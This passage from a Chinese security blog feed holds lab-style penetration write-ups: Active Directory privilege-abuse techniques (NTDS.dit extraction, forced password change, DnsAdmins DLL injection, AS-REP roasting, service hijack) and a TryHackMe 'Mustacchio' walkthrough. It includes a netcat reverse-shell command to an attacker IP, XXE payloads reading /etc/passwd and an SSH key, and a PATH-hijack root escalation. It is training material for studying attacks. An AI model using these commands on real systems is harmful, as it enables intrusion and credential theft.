9658d1d1dcd9250115e2205d9f48400d</span><br></pre></td></tr></table></figure><p>通过我们之前导入的bloodhound的分析结果，我们得知该用户属于backup_operators组的成员</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474582386-8f350409-cffc-49f0-a6c6-459226ce5b50.png" alt="img"></p><p>因此该用户也很有可能是启用SEBackupPrivilege 权限的用户。我们执行如下命令，看一下其是否有该权限</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474710566-e486b9ce-7659-4bb5-9a5f-7df982f8b3a7.png" alt="img"></p><p>此时我们知道了我们拥有SEBackupPrivilege 权限，所以我们可以通过使用签名的二进制文件创建 NTDS.dit 的卷影副本来完成diskshadow 首先，创建一个名为 cmd.txt 的文本文件，其中包含以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters#</span><br><span class="line">add volume c: alias new1#</span><br><span class="line">set metadata c:\windows\system32\spool\drivers\color\example.cab # 添加的部分</span><br><span class="line">create#</span><br><span class="line">expose %new1% z:#</span><br></pre></td></tr></table></figure><p><a href="https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm">参考链接</a></p><p>然后执行diskshadow 并使用脚本文件作为其输入，接着我们可以使用这个<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>提供的两个<code>dll</code>文件，并按照其提供的步骤操作，来复制创建的 NTDS.dit 卷影副本<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>提供的两个<code>dll</code>文件，并按照其提供的步骤操作，来复制创建的 NTDS.dit 卷影副本</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474999442-6b1f0738-c080-4c36-a78a-7c74126646f5.png" alt="img"></p><p>将备份<code>ntds.dit</code>文件移动到当前文件夹</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475051343-dfa3b6e4-ed37-49b2-8a89-7d8b8a56c93f.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475071949-2357f008-5615-4c3e-9359-1fdf1131d018.png" alt="img"></p><p>从注册表中获取<code>system.hive</code>文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475094698-b226e8d3-c6f3-42b8-b977-2b493b7108fb.png" alt="img"></p><p>使用使用<code>secretsdump.py</code> 解析 <code>NTDS.dit</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475182029-fb8f0bee-8505-40ec-a0b9-03975d9f8a92.png" alt="img"></p><h1>滥用ForceChangePassword权限实现横向移动</h1><p>简介： ForceChangePassword:强制更改密码,在不知道当前密码的情况下更改目标用户的密码。</p><p><strong>实际应用场景：</strong></p><p>我们在bloodhound可以看到support用户对AUDIT用户具有ForceChangePassword权限，顾名思义，就是<code>support</code>用户可以修改<code>audit2020</code>用户的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474359846-8e391f96-fd25-4058-85c8-a9d9cb4c62bf.png" alt="img"></p><p>尝试利用<code>rpcclient</code>修改<code>audit2020</code>用户的密码</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">rpcclient</span> -<span class="type">U</span> sup<span class="keyword">port</span> <span class="comment">--password=&#x27;#00^BlackKnight&#x27; //10.10.10.192</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410545-68568a43-0b82-47a6-b1a6-b1622f313551.png" alt="img"></p><p>修改密码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuseri<span class="symbol">nfo2</span> audit<span class="number">2020</span> <span class="number">23</span> <span class="string">&#x27;test&#x27;</span></span><br></pre></td></tr></table></figure><p>其中<code>23</code>表示用户信息级别为设置用户密码的级别</p><p>当设置的新密码与密码策略不匹配时会返回，设置一个复杂度比较高的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410762-e611b9c2-f7f9-47cd-97bf-79a2e6529afe.png" alt="img"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuseri<span class="symbol">nfo2</span> audit<span class="number">2020</span> <span class="number">23</span> <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410695-e764bb99-4163-4b61-8096-2adfac47c699.png" alt="img"></p><p>利用<code>crackmapexec</code>验证一下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crackmapexec</span> smb <span class="number">10.10.10.192</span> -u audit2020 -p <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410789-3eeb3d55-f904-497e-920e-ea8f6f2c9a56.png" alt="img"></p><p>尝试通过<code>audit2020</code>用户去获得更多<code>smb</code>共享目录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.192</span> -u audit2020 -p <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474459320-bffb8374-1d2d-4a93-829a-585dbbd01e8a.png" alt="img"><br>相比于之前的那个用户，我们获得了目录forensic的访问权限，可以进行进一步的信息搜集，或者利用该用户的权限来进行一些原本无法实现的操作。</p><h1>滥用DNS Admin组权限实现权限提升</h1><p>简介：当我们有权访问恰好是 DNSAdmins 组成员的用户帐户时，或者当受感染的用户帐户对 DNS 服务器对象具有写入权限时，我们可以滥用他的成员资格从而升级为管理员权限。简单来讲，DNSAdmins 组的成员可以访问网络 DNS 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。默认情况下，DNSAdmins 没有启动或停止 DNS 服务的能力，但管理员授予该组成员该权限并不罕见，当dnsadmins 组的成员被授予该权限时可用于通过 dll 注入将权限提升到管理员。</p><p><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">参考链接</a></p><p><strong>实际应用场景：</strong></p><p>我们发现ryan用户是DNSAdmins 组的成员</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475243149-3c4322d0-7ee2-4757-a692-32e1ce657827.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475252762-af3b7dd7-a0a3-439c-a11e-db618de2dda6.png" alt="img"></p><p>发现<code>ryan</code>用户属于<code>contractors</code>组，而<code>contractors</code>组又属于<code>dnsadmins</code>组，所以<code>ryan</code>用户属于<code>dnsadmins</code>组</p><p>就可以利用 <code>DnsAdmins</code>权限进行<code>AD</code>域提权</p><p>在目标上，我们可以更改 dns 的配置，因为用户 ryan 属于dnsadmins组。我们还可以启动和停止 dns 服务。</p><p>首先我们可以使用 msfvenom 生成我们的有效负载 dll，然后启动smb服务</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475429673-387fa037-6643-4f57-a4b7-9ec4a03c6f46.png" alt="img"></p><p>因为正常<code>upload</code>传文件会被杀掉，这里考虑使用<code>smb</code>传文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475452509-72be61e3-8633-403d-b13c-4af30b38242b.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475472509-3bb24eb0-058d-4dd0-a356-b481a1837b7a.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475500613-a48af79f-d61b-4f3f-a486-0fed00f873cd.png" alt="img"></p><p>此时，之前利用<code>python</code>起的<code>smbserver</code>服务会收到回显</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475513971-bf7ec014-3dde-4ea8-b0d9-e76bc3e3ecd7.png" alt="img"></p><h1>滥用AD Recycle Bin权限实现权限提升</h1><p><strong>简介：</strong><code>AD Recycle Bin</code>是一个著名的 Windows 组。<a href="https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/">Active Directory 对象恢复（或回收站）</a>是 Server 2008 中添加的一项功能，允许管理员恢复已删除的项目，就像回收站对文件所做的一样。在 Windows Server 2012 之前，从 AD 回收站还原对象需要使用 LDAP 工具或 PowerShell 列出所有已删除的对象，筛选一长串对象以找到所需的对象，然后使用另一个 PowerShell 命令来还原它。</p><p><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">参考链接</a></p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了arksvc用户的shell，我们之前还找到了一个旧电子邮件，在该邮件中提到临时管理员帐户TempAdmin使用了与正常管理员帐户相同的密码（密码复用）。</p><p>通过使用以下命令我们可以查看当前用户的所属组</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475837278-8d50a4a2-e1df-4627-ac9d-f48bf6575c13.png" alt="img"></p><p>发现该用户属于 <code>AD Recycle Bin</code> 组下</p><p>我们可以使用以下命令来列出所有已删除的对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27; -includeDeletedObjects</span><br></pre></td></tr></table></figure><p>最后一条比较有意思，我们发现了前面提到的临时用户<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475859325-8779824d-b8cc-4b0d-a80b-e5b2856edb2f.png" alt="img"></p><p>我们可以使用以下命令来获得该帐户的所有详细信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#123; SAMAccountName -eq &quot;TempAdmin&quot; &#125; -includeDeletedObjects -property *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475880391-e2411730-f329-425e-97d8-20698e5532fc.png" alt="img"></p><p>在该用户的详细信息中，我们发现了该用户的密码，尝试解密后成功得到了TempAdmin用户的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475890680-ac1aece6-3118-4631-b56d-4e3d66390fd2.png" alt="img"></p><h1>滥用GenericWrite权限实现横向移动</h1><p>简介：GenericWrite权限也就是通用写访问权限，该权限授予你写入目标对象上任何不受保护的属性的能力，包括组的“成员”和用户的“服务主体名称”。</p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了用户sbauer的shell，这里我们尝试使用Blooodhound进行信息搜集</p><p>我们将bloodhound生成的json文件导入bloodhound分析，发现当前用户对JORDEN用户具有通用写权限，而JORDEN用户属于SERVER_OPERATORS组（高权限组）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476044125-d4e5a90e-0eef-4ba9-8b65-0b649b2ba734.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476048485-acb32246-5fac-4f8a-a765-f008c9ac1260.png" alt="img"></p><p>这里我们说一下 AS-REP roasting攻击，该攻击允许为选择了“不需要 Kerberos 预身份验证”属性的用户检索密码哈希的技术。如果用户没有启用 Kerberos 预身份验证，我们可以为该用户请求 AS-REP，并且可以离线破解从而尝试恢复其明文密码。而这里SBAUER用户对JORDEN用户具有通用写权限，那么我们可以为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性，从而尝试使用AS-REP roasting攻击获取其明文密码。</p><p>我们可以使用下面这条命令来为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true</span><br></pre></td></tr></table></figure><p>然后我们可以使用impactet下的GetNPUsers脚本来获取jorden用户的AS-rep票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476143216-698c4f6a-f388-42dd-a82a-2ee98e260bef.png" alt="img"></p><p>我们把获取到的票据放到hash文件中，然后使用john尝试破解获取其明文密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476176979-31d3745a-67a1-4f4a-ad78-6dd2636610aa.png" alt="img"></p><h1>滥用Server Operators组权限实现权限提升</h1><p>简介：Server Operators组：该组仅存在于域控制器上的内置组。默认情况下，该组没有成员。服务器操作员可以交互式登录到服务器；创建和删除网络共享；启动和停止服务；备份和恢复文件；格式化电脑硬盘；并关闭计算机。</p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了用户jorden的shell，默认情况下，该组具备启动和停止服务的能力，并且该用户可以编辑任何服务。</p><p>所以这里使用服务路径劫持的方式来获得系统权限，首先上传<code>nc64.exe</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476259349-579d5f77-1f83-4c0f-a10f-0b79ba25a3f7.png" alt="img"></p><p>经过多次测试后发现可以改变<code>browser</code>服务的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config browser binPath= &quot;C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476289851-b941cc82-2cac-4397-aa64-28836741e29c.png" alt="img"></p><p>kali中监听</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476314438-071e3dff-f44c-4642-af3f-468f24b3703c.png" alt="img"></p><p>然后在靶机中手动重启<code>browser</code>服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sc.exe </span>stop <span class="keyword">browser</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sc.exe </span>start <span class="keyword">browser</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476328205-93ec8e94-e4e1-4ebd-816a-7906abdb834f.png" alt="img"></p><p>kali回显</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476340802-ebdc5e40-2d33-4ba0-9c94-a4bc88d719c6.png" alt="img"></p><h1>滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取</h1><p>简介：SeBackupPrivilege权限：可以用来实现备份操作，对当前系统任意文件具有读权限 。 SeRestorePrivilege权限：该权限被描述为“需要执行恢复操作”，并导致系统将所有写访问控制权授予任何系统上的文件，而不考虑文件 ACL。 此外，该特权允许持有进程或线程更改所有者文件,因此获得此特权的含义应该是显而易见的。</p><p><strong>实际应用场景：</strong></p><p>通过使用<code>whoami /priv</code>命令发现该用户具有SeBackupPrivilege<code>和</code>SeRestorePrivilege权限</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476369509-5732c90f-3163-4206-a718-5a14af619fb9.png" alt="img"></p><p>有了SeBackupPrivilege和SeRestorePrivilege这两个权限，我就可以用<code>robocopy</code>来复制敏感文件并读取其内容，在实战环境下我们可以尝试读取其他的一些敏感文件。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476393196-787cc0bc-4227-40fa-a7a8-6042007fc928.png" alt="img"></p>]]></content>
    
    
    <summary type="html">域渗透中可滥用权限及其应用总结</summary>
    
    
    
    <category term="域渗透应用" scheme="https://ya1orin.github.io/categories/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%BA%94%E7%94%A8/"/>
    
    
    <category term="权限提升" scheme="https://ya1orin.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="横向移动" scheme="https://ya1orin.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    
    <category term="权限滥用" scheme="https://ya1orin.github.io/tags/%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>THM-Mustacchio</title>
    <link href="https://ya1orin.github.io/posts/1b81dcb8.html"/>
    <id>https://ya1orin.github.io/posts/1b81dcb8.html</id>
    <published>2024-10-15T06:59:34.000Z</published>
    <updated>2024-11-13T05:19:30.592Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.235.246</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2><p><code>nmap -T4 -A -sV -sC -p- 10.10.235.246</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 15:02 CST</span><br><span class="line">Stats: 0:05:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 98.06% done; ETC: 15:07 (0:00:06 remaining)</span><br><span class="line">Stats: 0:05:45 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute</span><br><span class="line">Traceroute Timing: About 32.26% done; ETC: 15:08 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.10.235.246</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)</span><br><span class="line">|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)</span><br><span class="line">|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/</span><br><span class="line">|_http-title: Mustacchio | Home</span><br><span class="line">8765/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.10.3 (Ubuntu)</span><br><span class="line">|_http-title: Mustacchio | Login</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose|specialized|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 3.X|5.X (90%), Crestron 2-Series (86%), HP embedded (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Linux 5.4 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   275.52 ms 10.14.0.1</span><br><span class="line">2   355.01 ms 10.10.235.246</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 361.77 seconds</span><br></pre></td></tr></table></figure><p>可以看出开放了22，80，8765端口</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151010430-1583807408.png" alt="image-20241015150958963"></p><p>扫描下目录</p><p><code>gobuster dir -u http://10.10.235.246/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151712711-928501733.png" alt="image-20241015151701655"></p><p>发现有个<code>robots.txt</code>，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151751823-1230137278.png" alt="image-20241015151741043"></p><p>没啥东西，继续查看其他目录文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015152256352-1632797138.png" alt="image-20241015152243976"></p><p>在<code>/custom/js/</code>下找到<code>users.bak</code>文件，像是备份文件，下载到本地查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015152858740-1160933654.png" alt="image-20241015152847711"></p><p>看起来像是数据库中的数据，这里有admin的加密密码，尝试破解一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153033461-1519619990.png" alt="image-20241015153022188"></p><p>利用<code>john</code>成功获取到admin用户的明文密码<code>bulldog19</code></p><h2 id="8765端口">8765端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151929654-275177714.png" alt="image-20241015151918464"></p><p>像是admin后台登陆页面</p><p>使用之前获取到的用户名密码尝试登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153202210-1089947038.png" alt="image-20241015153151381"></p><p>成功登录</p><p>像是添加内容的一个页面，查看下源码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153411288-847205401.png" alt="image-20241015153400373"></p><p>又得到两个重要提示，一个是另一个bak文件，一个提示我们可以使用ssh连接Barry用key，但是我们目前还没有Barry用户的key</p><p>先看下bak文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153629081-249297029.png" alt="image-20241015153618211"></p><p>内容有点像之前添加内容的格式，尝试添加一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153834233-1962745226.png" alt="image-20241015153823235"></p><p>发现格式正确，可以试下其他的内容，测试是否存在xxe漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015154132533-1313842141.png" alt="image-20241015154121078"></p><p>发现能够读取<code>/etc/passwd</code>文件，我们就可以尝试读取<code>Barry</code>用户的ssh私钥来登录该用户</p><h1>SSH获取user权限</h1><p>首先确定好私钥的绝对路径</p><p><code>/home/barry/.ssh/id_rsa</code></p><p>构造恶意内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///home/barry/.ssh/id_rsa&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015154516232-8958968.png" alt="image-20241015154505258"></p><p>成功读取到私钥，将其保存至<code>id_rsa</code>文件**（注意格式）**，并赋予<code>600</code>权限，爆破加密私钥的密码</p><p>利用ssh通过私钥登录的方式常熟登录Barry用户</p><p>先将<code>id_rsa</code>转换成hash格式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155431516-1174663865.png" alt="image-20241015155420384"></p><p>使用john爆破密码</p><p><code>john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155556279-2034530019.png" alt="image-20241015155545683"></p><p>发现密码<code>urieljames</code>，使用私钥登录ssh</p><p><code>ssh barry@10.10.235.246 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155820199-1962063428.png" alt="image-20241015155809630"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155843741-2084925548.png" alt="image-20241015155833241"></p><p>在当前目录下找到<code>user.txt</code></p><h1>提升至root权限</h1><h2 id="寻找提权目标">寻找提权目标</h2><p>使用<code>sudo -l</code>试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015160125542-1414416860.png" alt="image-20241015160114807"></p><p>发现用不了，再试试find命令</p><p><code>find / -type f -perm -u=s 2&gt;/dev/null </code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015160354842-450932405.png" alt="image-20241015160335569"></p><p>大多数命令都无法利用，但是发现有个不同的文件<code>/home/joe/live_log</code>，可以查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015161626529-819413202.png" alt="image-20241015161615266"></p><p>发现是一个elf文件，运行一下试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015161654143-1177441879.png" alt="image-20241015161642992"></p><p>发现是打印网站的日志的功能</p><p>使用strings检查一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015162050015-1226680986.png" alt="image-20241015162039262"></p><p>检查后发现这个文件在执行的时候会调用<code>tail</code>命令，我们就可以通过劫持该命令进行提权</p><h2 id="劫持环境变量提权">劫持环境变量提权</h2><p>具体操作如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; /tmp/tail</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; /tmp/tail</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/tail</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163243415-624662868.png" alt="image-20241015163231776"></p><p>再运行时，就会按照顺序执行我们构造的<code>tail</code>命令，导致权限提升</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163323308-831948752.png" alt="image-20241015163312818"></p><p>成功提权</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163355336-310839046.png" 